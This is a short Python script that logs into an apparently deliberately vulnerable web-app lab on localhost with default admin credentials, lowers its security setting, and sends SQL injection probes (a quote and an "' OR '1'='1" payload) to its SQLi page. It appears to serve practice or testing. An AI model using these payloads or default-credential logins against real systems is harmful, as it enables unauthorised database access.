import requests
import re

session = requests.Session()

# Login and set security to LOW
login_data = {'username': 'admin', 'password': 'password', 'Login': 'Login'}
session.post("http://localhost/login.php", data=login_data)

security_data = {'security': 'low', 'submit': 'Submit'}
session.post("http://localhost/security.php", data=security_data)

url = "http://localhost/vulnerabilities/sqli/"

# Fetch page to get CSRF token
page_resp = session.get(url)
csrf_match = re.search(r'name=["\']user_token["\']\s+value=["\']([^"\']+)["\']', page_resp.text)
csrf_token = csrf_match.group(1) if csrf_match else None

print(f"CSRF Token: {csrf_token}")

# Test 1: Normal ID
payload1_data = {'id': '1', 'Submit': 'Submit', 'user_token': csrf_token}
r1 = session.post(url, data=payload1_data)
print(f"\nTest 1 (id=1):")
print(f"  Status: {r1.status_code}, Length: {len(r1.text)}")
print(f"  Contains 'User ID': {'User ID' in r1.text}")

# Test 2: SQL injection with quote
payload2_data = {'id': "'", 'Submit': 'Submit', 'user_token': csrf_token}
r2 = session.post(url, data=payload2_data)
print(f"\nTest 2 (id='):")
print(f"  Status: {r2.status_code}, Length: {len(r2.text)}")
print(f"  Contains error: {'error' in r2.text.lower()}")
print(f"  Response snippet: {r2.text[1500:1700]}")

# Test 3: Boolean-based SQLi
payload3_data = {'id': "' OR '1'='1", 'Submit': 'Submit', 'user_token': csrf_token}
r3 = session.post(url, data=payload3_data)
print(f"\nTest 3 (id=' OR '1'='1):")
print(f"  Status: {r3.status_code}, Length: {len(r3.text)}")
print(f"  Contains 'User ID': {'User ID' in r3.text}")
